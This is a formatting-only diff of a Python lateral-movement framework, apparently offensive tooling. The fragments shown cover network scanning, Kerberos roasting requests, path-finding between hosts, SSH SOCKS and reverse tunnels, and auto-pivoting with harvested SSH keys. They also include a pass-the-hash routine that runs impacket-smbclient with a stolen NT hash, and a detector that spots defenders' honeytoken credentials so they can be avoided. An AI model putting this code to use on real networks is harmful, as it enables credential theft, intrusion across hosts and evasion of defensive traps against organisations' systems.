@@ -62,8 +62,6 @@ class MovementTechnique(Enum):
     PASS_THE_TICKET = "ptt"
 
 
-
-
 # =============================================================================
 # DATA CLASSES
 # =============================================================================
@@ -358,7 +356,9 @@ class NetworkMapper:
             return f"{ip}/24"
 
     def quick_scan(
-        self, target: str, ports: list[int] | None = None,
+        self,
+        target: str,
+        ports: list[int] | None = None,
     ) -> NetworkHost | None:
         """Quick port scan of a single target.
 
@@ -537,9 +537,7 @@ class KerberosPacketFactory:
         # KDC-REQ-BODY Sequence
         # options: 4 (Forwardable) -> BIT STRING
         # We skip options for minimal roast check req
-        req_body_content = (
-            seq(0xA0, int_val(0)) + cname + realm + sname + till + nonce + etypes
-        )
+        req_body_content = seq(0xA0, int_val(0)) + cname + realm + sname + till + nonce + etypes
         req_body = seq(0x30, req_body_content)
 
         # 3. Build KDC-REQ
@@ -670,9 +668,7 @@ class ADAnalyzer:
         An edge ``other → hostname`` is added when *hostname* has an open
         port that maps to a known lateral-movement technique.
         """
-        adj: dict[str, list[tuple[str, MovementTechnique, str]]] = {
-            h: [] for h in hosts
-        }
+        adj: dict[str, list[tuple[str, MovementTechnique, str]]] = {h: [] for h in hosts}
         for hostname, host in hosts.items():
             edge = self._first_technique_for(host)
             if edge is None:
@@ -703,9 +699,7 @@ class ADAnalyzer:
         from collections import deque
 
         visited: set[str] = {source}
-        queue: deque[
-            tuple[str, list[str], list[MovementTechnique], list[str]]
-        ] = deque([(source, [], [], [])])
+        queue: deque[tuple[str, list[str], list[MovementTechnique], list[str]]] = deque([(source, [], [], [])])
 
         while queue:
             node, hops, techs, creds = queue.popleft()
@@ -806,9 +800,7 @@ class LateralMover:
         }
 
         if credential.credential_type != CredentialType.SSH_KEY:
-            result["error"] = (
-                "Password authentication requires sshpass (Not implemented)"
-            )
+            result["error"] = "Password authentication requires sshpass (Not implemented)"
             return result
 
         key_file = self._prepare_ssh_key(credential.value)
@@ -1004,13 +996,9 @@ class TunnelManager:
         if config.tunnel_type == "socks5":
             base_cmd += f" -D {config.local_port}"
         elif config.tunnel_type == "ssh_forward":
-            base_cmd += (
-                f" -L {config.local_port}:{config.remote_host}:{config.remote_port}"
-            )
+            base_cmd += f" -L {config.local_port}:{config.remote_host}:{config.remote_port}"
         elif config.tunnel_type == "ssh_reverse":
-            base_cmd += (
-                f" -R {config.remote_port}:localhost:{config.local_port}"
-            )
+            base_cmd += f" -R {config.remote_port}:localhost:{config.local_port}"
 
         # Add key if available
         if config.credential and config.credential.credential_type == CredentialType.SSH_KEY:
@@ -1040,12 +1028,15 @@ class TunnelManager:
             try:
                 if sys.platform == "win32":
                     import subprocess as _sp
+
                     _sp.run(
                         ["taskkill", "/PID", str(config.pid), "/F"],
-                        capture_output=True, check=False,
+                        capture_output=True,
+                        check=False,
                     )
                 else:
                     import signal as _sig
+
                     os.kill(config.pid, _sig.SIGTERM)
                 logger.info("Tunnel on port %d closed", local_port)
             except OSError as e:
@@ -1160,11 +1151,7 @@ class AutoPivot:
             return established
 
         # Get SSH credentials
-        ssh_creds = [
-            c
-            for c in self.harvester.harvested
-            if c.credential_type == CredentialType.SSH_KEY
-        ]
+        ssh_creds = [c for c in self.harvester.harvested if c.credential_type == CredentialType.SSH_KEY]
 
         for pivot in pivots:
             if 22 not in pivot.ports:
@@ -1369,20 +1356,14 @@ class HiveMind:
     ) -> Credential | None:
         """Find a credential matching the movement technique."""
         for c in self.harvester.harvested:
-            if (
-                technique == MovementTechnique.SSH
-                and c.credential_type == CredentialType.SSH_KEY
-            ):
+            if technique == MovementTechnique.SSH and c.credential_type == CredentialType.SSH_KEY:
                 return c
             if (
                 technique in (MovementTechnique.PSEXEC, MovementTechnique.PASS_THE_HASH)
                 and c.credential_type == CredentialType.NTLM_HASH
             ):
                 return c
-            if (
-                technique == MovementTechnique.PASS_THE_TICKET
-                and c.credential_type == CredentialType.KERBEROS_TICKET
-            ):
+            if technique == MovementTechnique.PASS_THE_TICKET and c.credential_type == CredentialType.KERBEROS_TICKET:
                 return c
         return None
 
@@ -1422,9 +1403,7 @@ class HiveMind:
         }
 
         for i, hop in enumerate(path.hops):
-            technique = (
-                path.techniques[i] if i < len(path.techniques) else path.techniques[-1]
-            )
+            technique = path.techniques[i] if i < len(path.techniques) else path.techniques[-1]
             if not self._execute_hop(hop, technique, result):
                 break
 
@@ -1438,9 +1417,7 @@ class HiveMind:
             "current_host": self.current_host,
             "credentials": len(self.harvester.harvested),
             "discovered_hosts": len(self.mapper.discovered_hosts),
-            "domain": self.ad_analyzer.domain_info.name
-            if self.ad_analyzer.domain_info
-            else None,
+            "domain": self.ad_analyzer.domain_info.name if self.ad_analyzer.domain_info else None,
             "movement_stats": self.mover.get_movement_stats(),
             "pivot_status": self.auto_pivot.get_status(),
         }
@@ -1554,8 +1531,8 @@ class PassTheHashAutomation:
         """Check if Impacket tools are available."""
         try:
             import shutil
-            return shutil.which("impacket-smbclient") is not None or \
-                   shutil.which("smbclient.py") is not None
+
+            return shutil.which("impacket-smbclient") is not None or shutil.which("smbclient.py") is not None
         except Exception:
             return False
 
@@ -1576,6 +1553,7 @@ class PassTheHashAutomation:
 
         try:
             import subprocess
+
             # Format: DOMAIN/user@target -hashes LM:NT
             lm_hash = "aad3b435b51404eeaad3b435b51404ee"  # Empty LM
             nt_hash = ntlm_hash if len(ntlm_hash) == 32 else ntlm_hash.split(":")[-1]
@@ -1583,8 +1561,10 @@ class PassTheHashAutomation:
             cmd = [
                 "impacket-smbclient",
                 f"{domain}/{username}@{target}" if domain else f"{username}@{target}",
-                "-hashes", f"{lm_hash}:{nt_hash}",
-                "-c", "shares",
+                "-hashes",
+                f"{lm_hash}:{nt_hash}",
+                "-c",
+                "shares",
             ]
 
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
@@ -1725,8 +1705,13 @@ class HoneyTokenDetector:
         # Check for suspiciously simple passwords
         if credential.credential_type == CredentialType.PASSWORD:
             suspicious_passwords = [
-                "password", "password123", "admin123", "letmein",
-                "welcome1", "changeme", "secret123",
+                "password",
+                "password123",
+                "admin123",
+                "letmein",
+                "welcome1",
+                "changeme",
+                "secret123",
             ]
             if credential.value.lower() in suspicious_passwords:
                 self._record_detection("credential", credential.username, "common_password")
